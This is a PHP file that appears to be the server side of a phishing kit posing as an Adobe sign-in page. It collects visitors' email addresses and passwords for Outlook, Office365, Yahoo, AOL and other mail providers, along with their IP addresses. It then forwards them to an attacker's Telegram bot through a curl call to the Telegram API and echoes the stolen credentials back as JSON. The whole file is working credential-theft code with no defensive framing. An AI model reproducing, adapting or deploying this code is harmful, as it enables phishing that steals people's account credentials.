<?php
include 'telegram.php';
session_start();

$ip = $_SERVER['REMOTE_ADDR'];

 if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $Id = $_POST['id'];
    $Email = $_POST['email_address'];
    $Password = $_POST['password'];

    $_SESSION['id'] = $Id;

    if($Id==1){
        $name = "Outlook";
    } elseif($Id==2){
        $name = "Office360";
    } elseif($Id==3){
        $name = "Yahoomail";
    } elseif($Id==4){
        $name = "AOL";
    } elseif($Id==5){
        $name = "Other mail";
    }

    // Compose a simple HTML email message
    $message = "[+]━━【Adobe】━━[+]\n";
    $message .= "You have a new website form submission:\n";
    $message .= "IP Address:     ".$ip."\n";
    $message .= "Adobe Access Information:\n";
    $message .= "Id:      ".$name."\n";
    $message .= "Email:     " .$Email. "\n";
    $message .= "Password:   " .$Password. "\n";
    
    //Content
    $mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    // $response = curl_exec($curl);
	curl_exec($curl);



    $response = array(
        'status' => 'success',
        'message' => 'Id: ' .$name. ', Received username: ' . $Email . ', password: ' . $Password
    );
   
    curl_close($curl);
    // Set the content type header to JSON
    header('Content-Type: application/json');

    // Send the JSON response
    echo json_encode($response);

 }



?>

